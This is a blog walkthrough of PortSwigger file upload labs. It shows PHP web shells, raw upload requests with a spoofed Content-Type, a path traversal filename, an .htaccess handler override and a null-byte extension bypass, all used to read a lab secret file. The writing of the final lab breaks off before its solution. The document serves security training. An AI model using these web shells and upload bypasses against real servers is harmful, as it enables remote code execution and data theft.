---
title: Portswigger File Upload Labs 1
date: 2026-10-27
categories:
  - [Web, File Upload]
tags:
  - Web
  - Portswigger
cover: /images/russted.jpeg
---

Tackling File Upload Labs from Portswigger

<!-- more -->

---

## Lab: Remote code execution via web shell upload

### Description

>This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's file system.
>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

After logging in , you are allowed to upload an avatar . I uploaded a php file containing `<?php echo system($_GET['command']); ?>` and tried accesing it using a proxy:

![](images/wtgfbb.png)

It executes ... Now to list what is in carlos' home directory:

![](images/efgefwge.png)

There is 2 `secret` files . Opening them gives the text `bDtBoUZLlX0XppxRKSkbwaOIvI9FCLqxbDtBoUZLlX0XppxRKSkbwaOIvI9FCLqx` but as you might have noticed its just `bDtBoUZLlX0XppxRKSkbwaOIvI9FCLqx` twice . I uploaded and fetched another php file containing `<?php echo file_get_contents('/home/carlos/secret'); ?>` 

![](images/wergbge.png)

Submit and solve the lab

## Lab: Web shell upload via Content-Type restriction bypass

### Description

>This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.
>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

Logging and trying to upload a php file containing `<?php echo file_get_contents('/home/carlos/secret'); ?>` as an avatar elicits an error `Sorry, file type application/x-php is not allowed Only image/jpeg and image/png are allowed Sorry, there was an error uploading your file.`

Trying again , but this time intercepting the requesting in my proxy to inspect it

```http
POST /my-account/avatar HTTP/2
Host: 0aeb004d03223ea181c225b0004d0038.web-security-academy.net
Cookie: session=Ieb5wTQ4IB97xTyp0bHy9y77061BY978
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c
Content-Length: 528


------geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c
Content-Disposition: form-data; name="avatar"; filename="image2.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
------geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c
Content-Disposition: form-data; name="csrf"

OxtqrQi6QCL3wEG0nbBpdTsK9AG32CQM
------geckoformboundary7d735aeef08e6b0d3d878ca6b20b944c--

```

We can see that the site appends a `Content-Type: application/x-php` in the file part of the form. We can change that to `image/jpeg` and send the request.

This time we get a `The file avatars/image2.php has been uploaded.` instead of an error.

Navigating to where the file is at:

![](images/rwerwerwe.png)

## Lab: Web shell upload via path traversal

### Description

>This lab contains a vulnerable image upload function. The server is configured to prevent execution of user-supplied files, but this restriction can be bypassed by exploiting a secondary vulnerability.
>To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
>You can log in to your own account using the following credentials: `wiener:peter`

### Solve

The lab has a functionality where you can add an avatar . So lets try to add our php file with the web shell payload.

![](images/ddddd.png)

It wasn't turned down lets visit where its located and see if it executes . 

![](images/dferfgre.png)

Seems like all files uploaded to `/files/avatars` are loaded as static files. We'll need to upload the file to a different folder . How?

Lets inspect the request:

```http
POST /my-account/avatar HTTP/2
Host: 0a010097032b98f2813db6d3005000e2.web-security-academy.net
Cookie: session=c6iW0uZEobJDKl17UYibxYFr3B6WvK1Y
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:159.0) Gecko/20100101 Firefox/159.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----geckoformboundary180c14b6510df0639c327265a8640706
Content-Length: 510


------geckoformboundary180c14b6510df0639c327265a8640706
Content-Disposition: form-data; name="avatar"; filename="rce.php"
Content-Type: application/x-php

<?php echo system($_GET['command']); ?>

------geckoformboundary180c14b6510df0639c327265a8640706
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary180c14b6510df0639c327265a8640706
Content-Disposition: form-data; name="csrf"

IJB1mA0sdAcxVwCVlhcP2LFD3fkV7F41
------geckoformboundary180c14b6510df0639c327265a8640706--

```

What if there is a path traversal  vulnerability in the `filename=` parameter ? Let's test.

Changing the filename to `../rce.php` and we get:

![](images/vfrgrebhgh.png)

Seems the application has a filter lets try url encoding the key characters:

Changing the filename to `%2E%2E%2Frce.php` and we get:

![](images/jhyjhgjhgkjk.png)

The file was saved one folder up from `/avatars` , that's in `/files`. Lets try to access it:

![](images/gkjkhjkhjkhjk.png)

Now to access `carlos` secret file:

![](images/khjkhjkhjkyt8iuyti.png)

## Lab: Web shell upload via extension blacklist bypass

### Description

>This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.
>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

### Solve

>Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called .htaccess if one is present.

We know that the images we upload end up in `/files/avatars`. When we try to upload a php file we get errors stating that php files are not allowed . When I tried a different extension `php5` the image was successfully uploaded but rendered as is and not executable.

So i tried uploading a `.htaccess` file to the folder and rewrite a rule
`AddType application/x-httpd-php .txt` to make any `.txt` file executable as php. Afterwards i renamed my `rce.php` to `rce.txt` and uploaded it.

Trying to access the file , we find that unlike our earlier `php5` file , its not rendered explicitly.

Try to call commands to it `command=cat /home/carlos/secret` in our proxy and monitor the response.

![[Pasted image 20261105164438.png]]

## Lab: Web shell upload via obfuscated file extension

### Description

>This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

### Solve 
Trying to upload a php file gave the following error:

![[Pasted image 20261105172416.png]]

So the extension needs to end in either `jpg` or `png` .  I tried submitting an image with `rce.php.jpg` as the name and while it was uploaded successfully , it was not executable.

To find another bypass , I used `%00` before `.jpg` . This nullifies the second part of the name's extension server side. For example , my scripts name was `rce.php%00.jpg` and after uploading it , it shows:

![[Pasted image 20261105172701.png]]

The `.jpg` part is removed . Trying to access the file at `/files/avatars/rce.php`  , we don't get any errors and the contents of the file are not displayed . Meaning its executable . Run commands and get carlos' secret:

![[Pasted image 20261105172846.png]]

## Lab: Remote code execution via polyglot web shell upload

### Description

>This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
>To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

### Solve

